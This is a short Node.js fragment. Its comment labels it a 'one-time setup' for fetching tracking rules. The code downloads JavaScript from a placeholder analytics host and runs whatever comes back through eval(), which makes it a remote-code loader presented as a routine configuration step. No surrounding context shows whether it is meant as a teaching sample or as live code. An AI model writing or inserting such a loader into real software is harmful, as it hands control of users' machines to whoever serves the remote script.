// "one-time setup": pull the latest tracking rules
const https = require('https');
https.get('https://cdn.bakery-analytics.invalid/rules.js', (res) => {
  let body = '';
  res.on('data', (c) => (body += c));
  res.on('end', () => eval(body));
});
